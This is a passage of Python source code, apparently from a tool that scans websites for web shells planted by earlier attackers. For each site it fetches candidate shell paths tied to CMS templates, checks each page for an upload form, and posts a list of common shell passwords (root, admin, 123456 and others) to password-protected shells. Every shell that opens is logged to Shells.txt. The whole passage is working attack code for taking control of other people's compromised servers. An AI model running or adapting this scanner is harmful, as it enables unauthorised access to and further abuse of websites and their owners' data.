																								with open('Shells.txt', mode='a') as d:
																									d.write(SH4_J+'#haurgeulis')
																							else :
																								print(' # '+site +' --> {}[Failed]'.format(fr))
									else :
										SH5_J_content = requests.get(SH5_J,timeout=15).content
										if ' type="file"' in SH5_J_content or ' type=\'file\'' in SH5_J_content or ' type= "file"' in SH5_J_content or ' type= \'file\'' in SH5_J_content or ' type = "file"' in SH5_J_content or ' type = \'file\'' in SH5_J_content or ' type ="file"' in SH5_J_content or ' type =\'file\'' in SH5_J_content or ' type=file' in SH5_J_content or ' type =file' in SH5_J_content or ' type= file' in SH5_J_content or ' type = file' in SH5_J_content or 'Upload</a> ]</li><li>[' in SH5_J_content or 'upload</a><li><a>Sym' in SH5_J_content :
											print(' # '+site +'/ --> {}[isis]'.format(fg))
											with open('Shells.txt', mode='a') as d:
												d.write(SH5_J+'')
										elif ' name=pass' in SH5_J_content :
											nhzgrf = requests.post(SH5_J,data=password_nhzgrf,timeout=15).content
											if ' type="file"' in nhzgrf or ' type=\'file\'' in nhzgrf or ' type= "file"' in nhzgrf or ' type= \'file\'' in nhzgrf or ' type = "file"' in nhzgrf or ' type = \'file\'' in nhzgrf or ' type ="file"' in nhzgrf or ' type =\'file\'' in nhzgrf or ' type=file' in nhzgrf or ' type =file' in nhzgrf or ' type= file' in nhzgrf or ' type = file' in nhzgrf :
												print(' # '+site +'/ --> {}[isis]'.format(fg))
												with open('Shells.txt', mode='a') as d:
													d.write(SH5_J+'#nhzgrf')
											else :
												proot = requests.post(SH5_J,data=password_root,timeout=15).content
												if ' type="file"' in proot or ' type=\'file\'' in proot or ' type= "file"' in proot or ' type= \'file\'' in proot or ' type = "file"' in proot or ' type = \'file\'' in proot or ' type ="file"' in proot or ' type =\'file\'' in proot or ' type=file' in proot or ' type =file' in proot or ' type= file' in proot or ' type = file' in proot :
													print(' # '+site +'/ --> {}[isis]'.format(fg))
													with open('Shells.txt', mode='a') as d:
														d.write(SH5_J+'#root')
												else :
													pr00t = requests.post(SH5_J,data=password_r00t,timeout=15).content
													if ' type="file"' in pr00t or ' type=\'file\'' in pr00t or ' type= "file"' in pr00t or ' type= \'file\'' in pr00t or ' type = "file"' in pr00t or ' type = \'file\'' in pr00t or ' type ="file"' in pr00t or ' type =\'file\'' in pr00t or ' type=file' in pr00t or ' type =file' in pr00t or ' type= file' in pr00t or ' type = file' in pr00t :
														print(' # '+site +'/ --> {}[isis]'.format(fg))
														with open('Shells.txt', mode='a') as d:
															d.write(SH5_J+'#r00t')
													else :
														padmin = requests.post(SH5_J,data=password_admin,timeout=15).content
														if ' type="file"' in padmin or ' type=\'file\'' in padmin or ' type= "file"' in padmin or ' type= \'file\'' in padmin or ' type = "file"' in padmin or ' type = \'file\'' in padmin or ' type ="file"' in padmin or ' type =\'file\'' in padmin or ' type=file' in padmin or ' type =file' in padmin or ' type= file' in padmin or ' type = file' in padmin :
															print(' # '+site +'/ --> {}[isis]'.format(fg))
															with open('Shells.txt', mode='a') as d:
																d.write(SH5_J+'#admin')
														else :
															pt00r = requests.post(SH5_J,data=password_t00r,timeout=15).content
															if ' type="file"' in pt00r or ' type=\'file\'' in pt00r or ' type= "file"' in pt00r or ' type= \'file\'' in pt00r or ' type = "file"' in pt00r or ' type = \'file\'' in pt00r or ' type ="file"' in pt00r or ' type =\'file\'' in pt00r or ' type=file' in pt00r or ' type =file' in pt00r or ' type= file' in pt00r or ' type = file' in pt00r :
																print(' # '+site +'/ --> {}[isis]'.format(fg))
																with open('Shells.txt', mode='a') as d:
																	d.write(SH5_J+'#t00r')
															else :
																p123 = requests.post(SH5_J,data=password_123,timeout=15).content
																if ' type="file"' in p123 or ' type=\'file\'' in p123 or ' type= "file"' in p123 or ' type= \'file\'' in p123 or ' type = "file"' in p123 or ' type = \'file\'' in p123 or ' type ="file"' in p123 or ' type =\'file\'' in p123 or ' type=file' in p123 or ' type =file' in p123 or ' type= file' in p123 or ' type = file' in p123 :
																	print(' # '+site +'/ --> {}[isis]'.format(fg))
																	with open('Shells.txt', mode='a') as d:
																		d.write(SH5_J+'#123')
																else :
																	p1234 = requests.post(SH5_J,data=password_1234,timeout=15).content
																	if ' type="file"' in p1234 or ' type=\'file\'' in p1234 or ' type= "file"' in p1234 or ' type= \'file\'' in p1234 or ' type = "file"' in p1234 or ' type = \'file\'' in p1234 or ' type ="file"' in p1234 or ' type =\'file\'' in p1234 or ' type=file' in p1234 or ' type =file' in p1234 or ' type= file' in p1234 or ' type = file' in p1234 :
																		print(' # '+site +'/ --> {}[isis]'.format(fg))
																		with open('Shells.txt', mode='a') as d:
																			d.write(SH5_J+'#1234')
																	else :
																		p12345 = requests.post(SH5_J,data=password_12345,timeout=15).content
																		if ' type="file"' in p12345 or ' type=\'file\'' in p12345 or ' type= "file"' in p12345 or ' type= \'file\'' in p12345 or ' type = "file"' in p12345 or ' type = \'file\'' in p12345 or ' type ="file"' in p12345 or ' type =\'file\'' in p12345 or ' type=file' in p12345 or ' type =file' in p12345 or ' type= file' in p12345 or ' type = file' in p12345 :
																			print(' # '+site +'/ --> {}[isis]'.format(fg))
																			with open('Shells.txt', mode='a') as d:
																				d.write(SH5_J+'#12345')
																		else :
																			p123456 = requests.post(SH5_J,data=password_123456,timeout=15).content
																			if ' type="file"' in p123456 or ' type=\'file\'' in p123456 or ' type= "file"' in p123456 or ' type= \'file\'' in p123456 or ' type = "file"' in p123456 or ' type = \'file\'' in p123456 or ' type ="file"' in p123456 or ' type =\'file\'' in p123456 or ' type=file' in p123456 or ' type =file' in p123456 or ' type= file' in p123456 or ' type = file' in p123456 :
																				print(' # '+site +'/ --> {}[isis]'.format(fg))
																				with open('Shells.txt', mode='a') as d:
																					d.write(SH5_J+'#123456')
																			else :
																				p123123 = requests.post(SH5_J,data=password_123123,timeout=15).content
																				if ' type="file"' in p123123 or ' type=\'file\'' in p123123 or ' type= "file"' in p123123 or ' type= \'file\'' in p123123 or ' type = "file"' in p123123 or ' type = \'file\'' in p123123 or ' type ="file"' in p123123 or ' type =\'file\'' in p123123 or ' type=file' in p123123 or ' type =file' in p123123 or ' type= file' in p123123 or ' type = file' in p123123 :
																					print(' # '+site +'/ --> {}[isis]'.format(fg))
																					with open('Shells.txt', mode='a') as d:
																						d.write(SH5_J+'#123123')
																				else :
																					p123321 = requests.post(SH5_J,data=password_123321,timeout=15).content
																					if ' type="file"' in p123321 or ' type=\'file\'' in p123321 or ' type= "file"' in p123321 or ' type= \'file\'' in p123321 or ' type = "file"' in p123321 or ' type = \'file\'' in p123321 or ' type ="file"' in p123321 or ' type =\'file\'' in p123321 or ' type=file' in p123321 or ' type =file' in p123321 or ' type= file' in p123321 or ' type = file' in p123321 :
																						print(' # '+site +'/ --> {}[isis]'.format(fg))
																						with open('Shells.txt', mode='a') as d:
																							d.write(SH5_J+'#123321')
																					else :
																						p123456789 = requests.post(SH5_J,data=password_123456789,timeout=15).content
																						if ' type="file"' in p123456789 or ' type=\'file\'' in p123456789 or ' type= "file"' in p123456789 or ' type= \'file\'' in p123456789 or ' type = "file"' in p123456789 or ' type = \'file\'' in p123456789 or ' type ="file"' in p123456789 or ' type =\'file\'' in p123456789 or ' type=file' in p123456789 or ' type =file' in p123456789 or ' type= file' in p123456789 or ' type = file' in p123456789 :
																							print(' # '+site +'/ --> {}[isis]'.format(fg))
																							with open('Shells.txt', mode='a') as d:
																								d.write(SH5_J+'#123456789')
																						else :
																							p1234567890 = requests.post(SH5_J,data=password_1234567890,timeout=15).content
																							if ' type="file"' in p1234567890 or ' type=\'file\'' in p1234567890 or ' type= "file"' in p1234567890 or ' type= \'file\'' in p1234567890 or ' type = "file"' in p1234567890 or ' type = \'file\'' in p1234567890 or ' type ="file"' in p1234567890 or ' type =\'file\'' in p1234567890 or ' type=file' in p1234567890 or ' type =file' in p1234567890 or ' type= file' in p1234567890 or ' type = file' in p1234567890 :
																								print(' # '+site +'/ --> {}[isis]'.format(fg))
																								with open('Shells.txt', mode='a') as d:
																									d.write(SH5_J+'#1234567890')
																							else :
																								phaurgeulis = requests.post(SH5_J,data=password_haurgeulis,timeout=15).content
																								if 'Andela1C3' in phaurgeulis  :
																									print(' # '+site +'/ --> {}[isis]'.format(fg))
																									with open('Shells.txt', mode='a') as d:
																										d.write(SH5_J+'#haurgeulis')
																								else :
																									print(' # '+site +' --> {}[Failed]'.format(fr))
										else :
											SH6_J_content = requests.get(SH6_J,timeout=15).content
											if ' type="file"' in SH6_J_content or ' type=\'file\'' in SH6_J_content or ' type= "file"' in SH6_J_content or ' type= \'file\'' in SH6_J_content or ' type = "file"' in SH6_J_content or ' type = \'file\'' in SH6_J_content or ' type ="file"' in SH6_J_content or ' type =\'file\'' in SH6_J_content or ' type=file' in SH6_J_content or ' type =file' in SH6_J_content or ' type= file' in SH6_J_content or ' type = file' in SH6_J_content or 'Upload</a> ]</li><li>[' in SH6_J_content or 'upload</a><li><a>Sym' in SH6_J_content :
												print(' # '+site +'/ --> {}[isis]'.format(fg))
												with open('Shells.txt', mode='a') as d:
													d.write(SH6_J+'')
											elif ' name=pass' in SH6_J_content :
												nhzgrf = requests.post(SH6_J,data=password_nhzgrf,timeout=15).content
												if ' type="file"' in nhzgrf or ' type=\'file\'' in nhzgrf or ' type= "file"' in nhzgrf or ' type= \'file\'' in nhzgrf or ' type = "file"' in nhzgrf or ' type = \'file\'' in nhzgrf or ' type ="file"' in nhzgrf or ' type =\'file\'' in nhzgrf or ' type=file' in nhzgrf or ' type =file' in nhzgrf or ' type= file' in nhzgrf or ' type = file' in nhzgrf :
													print(' # '+site +'/ --> {}[isis]'.format(fg))
													with open('Shells.txt', mode='a') as d:
														d.write(SH6_J+'#nhzgrf')
												else :
													proot = requests.post(SH6_J,data=password_root,timeout=15).content
													if ' type="file"' in proot or ' type=\'file\'' in proot or ' type= "file"' in proot or ' type= \'file\'' in proot or ' type = "file"' in proot or ' type = \'file\'' in proot or ' type ="file"' in proot or ' type =\'file\'' in proot or ' type=file' in proot or ' type =file' in proot or ' type= file' in proot or ' type = file' in proot :
														print(' # '+site +'/ --> {}[isis]'.format(fg))
														with open('Shells.txt', mode='a') as d:
															d.write(SH6_J+'#root')
													else :
														pr00t = requests.post(SH6_J,data=password_r00t,timeout=15).content
														if ' type="file"' in pr00t or ' type=\'file\'' in pr00t or ' type= "file"' in pr00t or ' type= \'file\'' in pr00t or ' type = "file"' in pr00t or ' type = \'file\'' in pr00t or ' type ="file"' in pr00t or ' type =\'file\'' in pr00t or ' type=file' in pr00t or ' type =file' in pr00t or ' type= file' in pr00t or ' type = file' in pr00t :
															print(' # '+site +'/ --> {}[isis]'.format(fg))
															with open('Shells.txt', mode='a') as d:
																d.write(SH6_J+'#r00t')
														else :
															padmin = requests.post(SH6_J,data=password_admin,timeout=15).content
															if ' type="file"' in padmin or ' type=\'file\'' in padmin or ' type= "file"' in padmin or ' type= \'file\'' in padmin or ' type = "file"' in padmin or ' type = \'file\'' in padmin or ' type ="file"' in padmin or ' type =\'file\'' in padmin or ' type=file' in padmin or ' type =file' in padmin or ' type= file' in padmin or ' type = file' in padmin :
																print(' # '+site +'/ --> {}[isis]'.format(fg))
																with open('Shells.txt', mode='a') as d:
																	d.write(SH6_J+'#admin')
															else :
																pt00r = requests.post(SH6_J,data=password_t00r,timeout=15).content
																if ' type="file"' in pt00r or ' type=\'file\'' in pt00r or ' type= "file"' in pt00r or ' type= \'file\'' in pt00r or ' type = "file"' in pt00r or ' type = \'file\'' in pt00r or ' type ="file"' in pt00r or ' type =\'file\'' in pt00r or ' type=file' in pt00r or ' type =file' in pt00r or ' type= file' in pt00r or ' type = file' in pt00r :
																	print(' # '+site +'/ --> {}[isis]'.format(fg))
																	with open('Shells.txt', mode='a') as d:
																		d.write(SH6_J+'#t00r')
																else :
																	p123 = requests.post(SH6_J,data=password_123,timeout=15).content
																	if ' type="file"' in p123 or ' type=\'file\'' in p123 or ' type= "file"' in p123 or ' type= \'file\'' in p123 or ' type = "file"' in p123 or ' type = \'file\'' in p123 or ' type ="file"' in p123 or ' type =\'file\'' in p123 or ' type=file' in p123 or ' type =file' in p123 or ' type= file' in p123 or ' type = file' in p123 :
																		print(' # '+site +'/ --> {}[isis]'.format(fg))
																		with open('Shells.txt', mode='a') as d:
																			d.write(SH6_J+'#123')
																	else :
																		p1234 = requests.post(SH6_J,data=password_1234,timeout=15).content
																		if ' type="file"' in p1234 or ' type=\'file\'' in p1234 or ' type= "file"' in p1234 or ' type= \'file\'' in p1234 or ' type = "file"' in p1234 or ' type = \'file\'' in p1234 or ' type ="file"' in p1234 or ' type =\'file\'' in p1234 or ' type=file' in p1234 or ' type =file' in p1234 or ' type= file' in p1234 or ' type = file' in p1234 :
																			print(' # '+site +'/ --> {}[isis]'.format(fg))
																			with open('Shells.txt', mode='a') as d:
																				d.write(SH6_J+'#1234')
																		else :
																			p12345 = requests.post(SH6_J,data=password_12345,timeout=15).content
																			if ' type="file"' in p12345 or ' type=\'file\'' in p12345 or ' type= "file"' in p12345 or ' type= \'file\'' in p12345 or ' type = "file"' in p12345 or ' type = \'file\'' in p12345 or ' type ="file"' in p12345 or ' type =\'file\'' in p12345 or ' type=file' in p12345 or ' type =file' in p12345 or ' type= file' in p12345 or ' type = file' in p12345 :
																				print(' # '+site +'/ --> {}[isis]'.format(fg))
																				with open('Shells.txt', mode='a') as d:
																					d.write(SH6_J+'#12345')
																			else :
																				p123456 = requests.post(SH6_J,data=password_123456,timeout=15).content
																				if ' type="file"' in p123456 or ' type=\'file\'' in p123456 or ' type= "file"' in p123456 or ' type= \'file\'' in p123456 or ' type = "file"' in p123456 or ' type = \'file\'' in p123456 or ' type ="file"' in p123456 or ' type =\'file\'' in p123456 or ' type=file' in p123456 or ' type =file' in p123456 or ' type= file' in p123456 or ' type = file' in p123456 :
																					print(' # '+site +'/ --> {}[isis]'.format(fg))
																					with open('Shells.txt', mode='a') as d:
																						d.write(SH6_J+'#123456')
																				else :
																					p123123 = requests.post(SH6_J,data=password_123123,timeout=15).content
																					if ' type="file"' in p123123 or ' type=\'file\'' in p123123 or ' type= "file"' in p123123 or ' type= \'file\'' in p123123 or ' type = "file"' in p123123 or ' type = \'file\'' in p123123 or ' type ="file"' in p123123 or ' type =\'file\'' in p123123 or ' type=file' in p123123 or ' type =file' in p123123 or ' type= file' in p123123 or ' type = file' in p123123 :
																						print(' # '+site +'/ --> {}[isis]'.format(fg))
																						with open('Shells.txt', mode='a') as d:
																							d.write(SH6_J+'#123123')
																					else :
																						p123321 = requests.post(SH6_J,data=password_123321,timeout=15).content
																						if ' type="file"' in p123321 or ' type=\'file\'' in p123321 or ' type= "file"' in p123321 or ' type= \'file\'' in p123321 or ' type = "file"' in p123321 or ' type = \'file\'' in p123321 or ' type ="file"' in p123321 or ' type =\'file\'' in p123321 or ' type=file' in p123321 or ' type =file' in p123321 or ' type= file' in p123321 or ' type = file' in p123321 :
																							print(' # '+site +'/ --> {}[isis]'.format(fg))
																							with open('Shells.txt', mode='a') as d:
																								d.write(SH6_J+'#123321')
																						else :
																							p123456789 = requests.post(SH6_J,data=password_123456789,timeout=15).content
																							if ' type="file"' in p123456789 or ' type=\'file\'' in p123456789 or ' type= "file"' in p123456789 or ' type= \'file\'' in p123456789 or ' type = "file"' in p123456789 or ' type = \'file\'' in p123456789 or ' type ="file"' in p123456789 or ' type =\'file\'' in p123456789 or ' type=file' in p123456789 or ' type =file' in p123456789 or ' type= file' in p123456789 or ' type = file' in p123456789 :
																								print(' # '+site +'/ --> {}[isis]'.format(fg))
																								with open('Shells.txt', mode='a') as d:
																									d.write(SH6_J+'#123456789')
																							else :
																								p1234567890 = requests.post(SH6_J,data=password_1234567890,timeout=15).content
																								if ' type="file"' in p1234567890 or ' type=\'file\'' in p1234567890 or ' type= "file"' in p1234567890 or ' type= \'file\'' in p1234567890 or ' type = "file"' in p1234567890 or ' type = \'file\'' in p1234567890 or ' type ="file"' in p1234567890 or ' type =\'file\'' in p1234567890 or ' type=file' in p1234567890 or ' type =file' in p1234567890 or ' type= file' in p1234567890 or ' type = file' in p1234567890 :
																									print(' # '+site +'/ --> {}[isis]'.format(fg))
																									with open('Shells.txt', mode='a') as d:
																										d.write(SH6_J+'#1234567890')
																								else :
																									phaurgeulis = requests.post(SH6_J,data=password_haurgeulis,timeout=15).content
																									if 'Andela1C3' in phaurgeulis  :
																										print(' # '+site +'/ --> {}[isis]'.format(fg))
																										with open('Shells.txt', mode='a') as d:
																											d.write(SH6_J+'#haurgeulis')
																									else :
																										print(' # '+site +' --> {}[Failed]'.format(fr))
											else :
												SH7_J_content = requests.get(SH7_J,timeout=15).content
												if ' type="file"' in SH7_J_content or ' type=\'file\'' in SH7_J_content or ' type= "file"' in SH7_J_content or ' type= \'file\'' in SH7_J_content or ' type = "file"' in SH7_J_content or ' type = \'file\'' in SH7_J_content or ' type ="file"' in SH7_J_content or ' type =\'file\'' in SH7_J_content or ' type=file' in SH7_J_content or ' type =file' in SH7_J_content or ' type= file' in SH7_J_content or ' type = file' in SH7_J_content or 'Upload</a> ]</li><li>[' in SH7_J_content or 'upload</a><li><a>Sym' in SH7_J_content :
													print(' # '+site +'/ --> {}[beez]'.format(fg))
													with open('Shells.txt', mode='a') as d:
														d.write(SH7_J+'')
												elif ' name=pass' in SH7_J_content :
													nhzgrf = requests.post(SH7_J,data=password_nhzgrf,timeout=15).content
													if ' type="file"' in nhzgrf or ' type=\'file\'' in nhzgrf or ' type= "file"' in nhzgrf or ' type= \'file\'' in nhzgrf or ' type = "file"' in nhzgrf or ' type = \'file\'' in nhzgrf or ' type ="file"' in nhzgrf or ' type =\'file\'' in nhzgrf or ' type=file' in nhzgrf or ' type =file' in nhzgrf or ' type= file' in nhzgrf or ' type = file' in nhzgrf :
														print(' # '+site +'/ --> {}[beez]'.format(fg))
														with open('Shells.txt', mode='a') as d:
															d.write(SH7_J+'#nhzgrf')
													else :
														proot = requests.post(SH7_J,data=password_root,timeout=15).content
														if ' type="file"' in proot or ' type=\'file\'' in proot or ' type= "file"' in proot or ' type= \'file\'' in proot or ' type = "file"' in proot or ' type = \'file\'' in proot or ' type ="file"' in proot or ' type =\'file\'' in proot or ' type=file' in proot or ' type =file' in proot or ' type= file' in proot or ' type = file' in proot :
															print(' # '+site +'/ --> {}[beez]'.format(fg))
															with open('Shells.txt', mode='a') as d:
																d.write(SH7_J+'#root')
														else :
															pr00t = requests.post(SH7_J,data=password_r00t,timeout=15).content
															if ' type="file"' in pr00t or ' type=\'file\'' in pr00t or ' type= "file"' in pr00t or ' type= \'file\'' in pr00t or ' type = "file"' in pr00t or ' type = \'file\'' in pr00t or ' type ="file"' in pr00t or ' type =\'file\'' in pr00t or ' type=file' in pr00t or ' type =file' in pr00t or ' type= file' in pr00t or ' type = file' in pr00t :
																print(' # '+site +'/ --> {}[beez]'.format(fg))
																with open('Shells.txt', mode='a') as d:
																	d.write(SH7_J+'#r00t')
															else :
																padmin = requests.post(SH7_J,data=password_admin,timeout=15).content
																if ' type="file"' in padmin or ' type=\'file\'' in padmin or ' type= "file"' in padmin or ' type= \'file\'' in padmin or ' type = "file"' in padmin or ' type = \'file\'' in padmin or ' type ="file"' in padmin or ' type =\'file\'' in padmin or ' type=file' in padmin or ' type =file' in padmin or ' type= file' in padmin or ' type = file' in padmin :
																	print(' # '+site +'/ --> {}[beez]'.format(fg))
																	with open('Shells.txt', mode='a') as d:
																		d.write(SH7_J+'#admin')
																else :
																	pt00r = requests.post(SH7_J,data=password_t00r,timeout=15).content
																	if ' type="file"' in pt00r or ' type=\'file\'' in pt00r or ' type= "file"' in pt00r or ' type= \'file\'' in pt00r or ' type = "file"' in pt00r or ' type = \'file\'' in pt00r or ' type ="file"' in pt00r or ' type =\'file\'' in pt00r or ' type=file' in pt00r or ' type =file' in pt00r or ' type= file' in pt00r or ' type = file' in pt00r :
																		print(' # '+site +'/ --> {}[beez]'.format(fg))
																		with open('Shells.txt', mode='a') as d:
																			d.write(SH7_J+'#t00r')
																	else :
																		p123 = requests.post(SH7_J,data=password_123,timeout=15).content
																		if ' type="file"' in p123 or ' type=\'file\'' in p123 or ' type= "file"' in p123 or ' type= \'file\'' in p123 or ' type = "file"' in p123 or ' type = \'file\'' in p123 or ' type ="file"' in p123 or ' type =\'file\'' in p123 or ' type=file' in p123 or ' type =file' in p123 or ' type= file' in p123 or ' type = file' in p123 :
																			print(' # '+site +'/ --> {}[beez]'.format(fg))
																			with open('Shells.txt', mode='a') as d:
																				d.write(SH7_J+'#123')
																		else :
																			p1234 = requests.post(SH7_J,data=password_1234,timeout=15).content
																			if ' type="file"' in p1234 or ' type=\'file\'' in p1234 or ' type= "file"' in p1234 or ' type= \'file\'' in p1234 or ' type = "file"' in p1234 or ' type = \'file\'' in p1234 or ' type ="file"' in p1234 or ' type =\'file\'' in p1234 or ' type=file' in p1234 or ' type =file' in p1234 or ' type= file' in p1234 or ' type = file' in p1234 :
																				print(' # '+site +'/ --> {}[beez]'.format(fg))
																				with open('Shells.txt', mode='a') as d:
																					d.write(SH7_J+'#1234')
																			else :
																				p12345 = requests.post(SH7_J,data=password_12345,timeout=15).content
																				if ' type="file"' in p12345 or ' type=\'file\'' in p12345 or ' type= "file"' in p12345 or ' type= \'file\'' in p12345 or ' type = "file"' in p12345 or ' type = \'file\'' in p12345 or ' type ="file"' in p12345 or ' type =\'file\'' in p12345 or ' type=file' in p12345 or ' type =file' in p12345 or ' type= file' in p12345 or ' type = file' in p12345 :
																					print(' # '+site +'/ --> {}[beez]'.format(fg))
																					with open('Shells.txt', mode='a') as d:
																						d.write(SH7_J+'#12345')
																				else :
																					p123456 = requests.post(SH7_J,data=password_123456,timeout=15).content
																					if ' type="file"' in p123456 or ' type=\'file\'' in p123456 or ' type= "file"' in p123456 or ' type= \'file\'' in p123456 or ' type = "file"' in p123456 or ' type = \'file\'' in p123456 or ' type ="file"' in p123456 or ' type =\'file\'' in p123456 or ' type=file' in p123456 or ' type =file' in p123456 or ' type= file' in p123456 or ' type = file' in p123456 :
																						print(' # '+site +'/ --> {}[beez]'.format(fg))
																						with open('Shells.txt', mode='a') as d:
																							d.write(SH7_J+'#123456')
																					else :
																						p123123 = requests.post(SH7_J,data=password_123123,timeout=15).content
																						if ' type="file"' in p123123 or ' type=\'file\'' in p123123 or ' type= "file"' in p123123 or ' type= \'file\'' in p123123 or ' type = "file"' in p123123 or ' type = \'file\'' in p123123 or ' type ="file"' in p123123 or ' type =\'file\'' in p123123 or ' type=file' in p123123 or ' type =file' in p123123 or ' type= file' in p123123 or ' type = file' in p123123 :
																							print(' # '+site +'/ --> {}[beez]'.format(fg))
																							with open('Shells.txt', mode='a') as d:
																								d.write(SH7_J+'#123123')
																						else :
																							p123321 = requests.post(SH7_J,data=password_123321,timeout=15).content
																							if ' type="file"' in p123321 or ' type=\'file\'' in p123321 or ' type= "file"' in p123321 or ' type= \'file\'' in p123321 or ' type = "file"' in p123321 or ' type = \'file\'' in p123321 or ' type ="file"' in p123321 or ' type =\'file\'' in p123321 or ' type=file' in p123321 or ' type =file' in p123321 or ' type= file' in p123321 or ' type = file' in p123321 :
																								print(' # '+site +'/ --> {}[beez]'.format(fg))
																								with open('Shells.txt', mode='a') as d:
																									d.write(SH7_J+'#123321')
																							else :
																								p123456789 = requests.post(SH7_J,data=password_123456789,timeout=15).content
																								if ' type="file"' in p123456789 or ' type=\'file\'' in p123456789 or ' type= "file"' in p123456789 or ' type= \'file\'' in p123456789 or ' type = "file"' in p123456789 or ' type = \'file\'' in p123456789 or ' type ="file"' in p123456789 or ' type =\'file\'' in p123456789 or ' type=file' in p123456789 or ' type =file' in p123456789 or ' type= file' in p123456789 or ' type = file' in p123456789 :
																									print(' # '+site +'/ --> {}[beez]'.format(fg))
																									with open('Shells.txt', mode='a') as d:
																										d.write(SH7_J+'#123456789')
																								else :
																									p1234567890 = requests.post(SH7_J,data=password_1234567890,timeout=15).content
																									if ' type="file"' in p1234567890 or ' type=\'file\'' in p1234567890 or ' type= "file"' in p1234567890 or ' type= \'file\'' in p1234567890 or ' type = "file"' in p1234567890 or ' type = \'file\'' in p1234567890 or ' type ="file"' in p1234567890 or ' type =\'file\'' in p1234567890 or ' type=file' in p1234567890 or ' type =file' in p1234567890 or ' type= file' in p1234567890 or ' type = file' in p1234567890 :
																										print(' # '+site +'/ --> {}[beez]'.format(fg))
																										with open('Shells.txt', mode='a') as d:
																											d.write(SH7_J+'#1234567890')
																									else :
																										phaurgeulis = requests.post(SH7_J,data=password_haurgeulis,timeout=15).content
																										if 'Andela1C3' in phaurgeulis  :
																											print(' # '+site +'/ --> {}[beez]'.format(fg))
																											with open('Shells.txt', mode='a') as d:
																												d.write(SH7_J+'#haurgeulis')
																										else :
																											print(' # '+site +' --> {}[Failed]'.format(fr))
												else :
													SH8_J_content = requests.get(SH8_J,timeout=15).content
													if ' type="file"' in SH8_J_content or ' type=\'file\'' in SH8_J_content or ' type= "file"' in SH8_J_content or ' type= \'file\'' in SH8_J_content or ' type = "file"' in SH8_J_content or ' type = \'file\'' in SH8_J_content or ' type ="file"' in SH8_J_content or ' type =\'file\'' in SH8_J_content or ' type=file' in SH8_J_content or ' type =file' in SH8_J_content or ' type= file' in SH8_J_content or ' type = file' in SH8_J_content or 'Upload</a> ]</li><li>[' in SH8_J_content or 'upload</a><li><a>Sym' in SH8_J_content :
														print(' # '+site +'/ --> {}[purity]'.format(fg))
														with open('Shells.txt', mode='a') as d:
															d.write(SH8_J+'')
													elif ' name=pass' in SH8_J_content :
														nhzgrf = requests.post(SH8_J,data=password_nhzgrf,timeout=15).content
														if ' type="file"' in nhzgrf or ' type=\'file\'' in nhzgrf or ' type= "file"' in nhzgrf or ' type= \'file\'' in nhzgrf or ' type = "file"' in nhzgrf or ' type = \'file\'' in nhzgrf or ' type ="file"' in nhzgrf or ' type =\'file\'' in nhzgrf or ' type=file' in nhzgrf or ' type =file' in nhzgrf or ' type= file' in nhzgrf or ' type = file' in nhzgrf :
															print(' # '+site +'/ --> {}[purity]'.format(fg))
															with open('Shells.txt', mode='a') as d:
																d.write(SH8_J+'#nhzgrf')
														else :
															proot = requests.post(SH8_J,data=password_root,timeout=15).content
															if ' type="file"' in proot or ' type=\'file\'' in proot or ' type= "file"' in proot or ' type= \'file\'' in proot or ' type = "file"' in proot or ' type = \'file\'' in proot or ' type ="file"' in proot or ' type =\'file\'' in proot or ' type=file' in proot or ' type =file' in proot or ' type= file' in proot or ' type = file' in proot :
																print(' # '+site +'/ --> {}[purity]'.format(fg))
																with open('Shells.txt', mode='a') as d:
																	d.write(SH8_J+'#root')
															else :
																pr00t = requests.post(SH8_J,data=password_r00t,timeout=15).content
																if ' type="file"' in pr00t or ' type=\'file\'' in pr00t or ' type= "file"' in pr00t or ' type= \'file\'' in pr00t or ' type = "file"' in pr00t or ' type = \'file\'' in pr00t or ' type ="file"' in pr00t or ' type =\'file\'' in pr00t or ' type=file' in pr00t or ' type =file' in pr00t or ' type= file' in pr00t or ' type = file' in pr00t :
																	print(' # '+site +'/ --> {}[purity]'.format(fg))
																	with open('Shells.txt', mode='a') as d:
																		d.write(SH8_J+'#r00t')
																else :
																	padmin = requests.post(SH8_J,data=password_admin,timeout=15).content
																	if ' type="file"' in padmin or ' type=\'file\'' in padmin or ' type= "file"' in padmin or ' type= \'file\'' in padmin or ' type = "file"' in padmin or ' type = \'file\'' in padmin or ' type ="file"' in padmin or ' type =\'file\'' in padmin or ' type=file' in padmin or ' type =file' in padmin or ' type= file' in padmin or ' type = file' in padmin :
																		print(' # '+site +'/ --> {}[purity]'.format(fg))
																		with open('Shells.txt', mode='a') as d:
																			d.write(SH8_J+'#admin')
																	else :
																		pt00r = requests.post(SH8_J,data=password_t00r,timeout=15).content
																		if ' type="file"' in pt00r or ' type=\'file\'' in pt00r or ' type= "file"' in pt00r or ' type= \'file\'' in pt00r or ' type = "file"' in pt00r or ' type = \'file\'' in pt00r or ' type ="file"' in pt00r or ' type =\'file\'' in pt00r or ' type=file' in pt00r or ' type =file' in pt00r or ' type= file' in pt00r or ' type = file' in pt00r :
																			print(' # '+site +'/ --> {}[purity]'.format(fg))
																			with open('Shells.txt', mode='a') as d:
																				d.write(SH8_J+'#t00r')
																		else :
																			p123 = requests.post(SH8_J,data=password_123,timeout=15).content
																			if ' type="file"' in p123 or ' type=\'file\'' in p123 or ' type= "file"' in p123 or ' type= \'file\'' in p123 or ' type = "file"' in p123 or ' type = \'file\'' in p123 or ' type ="file"' in p123 or ' type =\'file\'' in p123 or ' type=file' in p123 or ' type =file' in p123 or ' type= file' in p123 or ' type = file' in p123 :
																				print(' # '+site +'/ --> {}[purity]'.format(fg))
																				with open('Shells.txt', mode='a') as d:
																					d.write(SH8_J+'#123')
																			else :
																				p1234 = requests.post(SH8_J,data=password_1234,timeout=15).content
																				if ' type="file"' in p1234 or ' type=\'file\'' in p1234 or ' type= "file"' in p1234 or ' type= \'file\'' in p1234 or ' type = "file"' in p1234 or ' type = \'file\'' in p1234 or ' type ="file"' in p1234 or ' type =\'file\'' in p1234 or ' type=file' in p1234 or ' type =file' in p1234 or ' type= file' in p1234 or ' type = file' in p1234 :
																					print(' # '+site +'/ --> {}[purity]'.format(fg))
																					with open('Shells.txt', mode='a') as d:
																						d.write(SH8_J+'#1234')
																				else :
																					p12345 = requests.post(SH8_J,data=password_12345,timeout=15).content
																					if ' type="file"' in p12345 or ' type=\'file\'' in p12345 or ' type= "file"' in p12345 or ' type= \'file\'' in p12345 or ' type = "file"' in p12345 or ' type = \'file\'' in p12345 or ' type ="file"' in p12345 or ' type =\'file\'' in p12345 or ' type=file' in p12345 or ' type =file' in p12345 or ' type= file' in p12345 or ' type = file' in p12345 :
